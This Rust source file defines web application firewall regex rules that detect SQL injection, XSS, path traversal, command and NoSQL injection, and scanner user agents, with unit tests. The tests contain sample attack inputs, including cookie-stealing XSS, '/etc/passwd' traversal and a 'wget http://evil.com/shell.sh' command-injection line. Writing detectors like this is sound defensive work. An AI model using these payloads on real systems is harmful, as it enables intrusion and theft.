use regex::RegexSet;

pub struct WafRules {
    sqli_set: RegexSet,
    xss_set: RegexSet,
    lfi_rfi_set: RegexSet,
    cmd_injection_set: RegexSet,
    bot_ua_set: RegexSet,

    // Original patterns kept for reporting which specific rule matched
    sqli_patterns: Vec<&'static str>,
    xss_patterns: Vec<&'static str>,
    lfi_rfi_patterns: Vec<&'static str>,
    cmd_injection_patterns: Vec<&'static str>,
    bot_ua_patterns: Vec<&'static str>,
}

impl WafRules {
    pub fn new() -> Self {
        // OWASP Top 10 - Injection (SQLi)
        let sqli_patterns = vec![
            r"(?i)(union\s+select|select\s+.*\s+from|insert\s+into|update\s+.*\s+set|drop\s+table)",
            r#"(?i)(and|or)\s+[\d'"]+\s*=\s*[\d'"]+"#, // e.g. OR 1=1
            r#"(?i)(\%27)|(')|(\-\-)|(\%23)|(#)"#,     // Basic quotes and comments
            r"(?i)(exec\s+xp_cmdshell|information_schema|waitfor\s+delay)", // Advanced SQLi
        ];

        // OWASP Top 10 - XSS
        let xss_patterns = vec![
            r"(?i)(<script>|javascript:|onerror=|onload=|eval\()",
            r"(?i)(<\s*img\s+src\s*=\s*x\s+onerror\s*=)",
            r"(?i)(document\.cookie|alert\(|prompt\()",
        ];

        // Broken Access Control (Path Traversal, LFI/RFI)
        let lfi_rfi_patterns = vec![
            r"(?i)(\.\./|\.\.\\|%2e%2e%2f|%2e%2e/)", // Directory Traversal
            r"(?i)(/etc/passwd|/windows/win\.ini|/boot\.ini)", // LFI
            r"(?i)(http(s)?://.*(cmd=|include=))",   // Potential RFI
        ];

        // OS Command Injection & NoSQL
        let cmd_injection_patterns = vec![
            r#"(?i)([;|&\`])\s*(cat|ls|pwd|whoami|id|curl|wget|nc|bash|sh)\b"#, // Command chain
            r"(?i)(\$|%24)\{.*\}",                                              // Env var expansion
            r"(?i)(\$gt|\$lt|\$ne|\$in|\$nin)",                                 // NoSQL operators
        ];

        // Malicious Scanners & Bots
        let bot_ua_patterns = vec![
            r"(?i)(sqlmap|nikto|zmap|nmap|masscan|curl|wget|python-requests|go-http-client|java/)",
            r"(?i)(dirbuster|scan|nuclei|acunetix|nessus)",
        ];

        Self {
            sqli_set: RegexSet::new(&sqli_patterns).unwrap(),
            xss_set: RegexSet::new(&xss_patterns).unwrap(),
            lfi_rfi_set: RegexSet::new(&lfi_rfi_patterns).unwrap(),
            cmd_injection_set: RegexSet::new(&cmd_injection_patterns).unwrap(),
            bot_ua_set: RegexSet::new(&bot_ua_patterns).unwrap(),

            sqli_patterns,
            xss_patterns,
            lfi_rfi_patterns,
            cmd_injection_patterns,
            bot_ua_patterns,
        }
    }

    /// Checks if the payload matches any OWASP Top 10 vulnerability rule.
    /// Returns the name of the violation category if found.
    pub fn inspect_payload(&self, payload: &str) -> Option<&'static str> {
        if self.sqli_set.is_match(payload) {
            return Some("SQL Injection (SQLi)");
        }
        if self.xss_set.is_match(payload) {
            return Some("Cross-Site Scripting (XSS)");
        }
        if self.lfi_rfi_set.is_match(payload) {
            return Some("Path Traversal / File Inclusion");
        }
        if self.cmd_injection_set.is_match(payload) {
            return Some("OS Command / NoSQL Injection");
        }
        None
    }

    /// Checks if the User-Agent belongs to a known malicious bot or scanner.
    pub fn is_malicious_bot(&self, user_agent: &str) -> bool {
        self.bot_ua_set.is_match(user_agent)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_sqli_detection() {
        let rules = WafRules::new();
        assert_eq!(
            rules.inspect_payload("?id=1' OR '1'='1"),
            Some("SQL Injection (SQLi)")
        );
        assert_eq!(
            rules.inspect_payload("?username=admin'--"),
            Some("SQL Injection (SQLi)")
        );
        assert_eq!(
            rules.inspect_payload("?q=UNION SELECT password FROM users"),
            Some("SQL Injection (SQLi)")
        );
        assert_eq!(
            rules.inspect_payload("?product=123; DROP TABLE products"),
            Some("SQL Injection (SQLi)")
        );

        // Benign SQL-like string
        assert_eq!(rules.inspect_payload("?q=how+to+select+a+good+apple"), None); // Too generic, should pass
    }

    #[test]
    fn test_xss_detection() {
        let rules = WafRules::new();
        assert_eq!(
            rules.inspect_payload("<script>alert(1)</script>"),
            Some("Cross-Site Scripting (XSS)")
        );
        assert_eq!(
            rules.inspect_payload("<img src=x onerror=alert(document.cookie)>"),
            Some("Cross-Site Scripting (XSS)")
        );
        assert_eq!(
            rules.inspect_payload("javascript:alert(1)"),
            Some("Cross-Site Scripting (XSS)")
        );

        // Benign HTML
        assert_eq!(rules.inspect_payload("<b>Hello World</b>"), None);
    }

    #[test]
    fn test_path_traversal_lfi() {
        let rules = WafRules::new();
        assert_eq!(
            rules.inspect_payload("?file=../../../etc/passwd"),
            Some("Path Traversal / File Inclusion")
        );
        assert_eq!(
            rules.inspect_payload("?file=%2e%2e%2f%2e%2e%2fwindows%2fwin.ini"),
            Some("Path Traversal / File Inclusion")
        );
        assert_eq!(
            rules.inspect_payload("?page=http://evil.com/shell.txt?cmd=whoami"),
            Some("Path Traversal / File Inclusion")
        );

        // Benign path
        assert_eq!(rules.inspect_payload("/images/logo.png"), None);
    }

    #[test]
    fn test_command_injection() {
        let rules = WafRules::new();
        assert_eq!(
            rules.inspect_payload("?ip=127.0.0.1; cat /etc/hosts"),
            Some("OS Command / NoSQL Injection")
        );
        assert_eq!(
            rules.inspect_payload("?dir=images | wget http://evil.com/shell.sh"),
            Some("OS Command / NoSQL Injection")
        );
        assert_eq!(
            rules.inspect_payload("?user[$ne]=admin"),
            Some("OS Command / NoSQL Injection")
        ); // NoSQL

        // Benign text
        assert_eq!(rules.inspect_payload("?category=cats_and_dogs"), None);
    }

    #[test]
    fn test_bot_detection() {
        let rules = WafRules::new();
        assert!(rules.is_malicious_bot("sqlmap/1.5.8#dev (http://sqlmap.org)"));
        assert!(rules.is_malicious_bot(
            "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
        ));
        assert!(rules.is_malicious_bot("java/1.8.0.212"));

        // Benign UA
        assert!(!rules.is_malicious_bot("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"));
    }
}
